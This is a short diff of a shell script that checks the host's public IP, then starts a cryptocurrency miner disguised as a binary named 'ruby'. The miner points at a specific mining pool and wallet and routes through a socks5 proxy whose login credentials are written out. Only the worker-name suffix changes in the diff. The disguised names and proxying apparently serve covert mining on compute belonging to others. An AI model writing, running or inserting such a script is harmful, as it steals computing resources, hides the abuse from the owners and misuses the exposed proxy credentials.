@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./ruby -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 20-999 -n 1)-EXCEL) -p c=CPU -x socks5://8n6mmv5waslzwj:wszcpmyf99l2e652pi8294gwc5jw0@34.238.108.61:1080 -t2
+./panel ./ruby -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 01-999 -n 1)-vina) -p c=CPU -x socks5://8n6mmv5waslzwj:wszcpmyf99l2e652pi8294gwc5jw0@34.238.108.61:1080 -t2
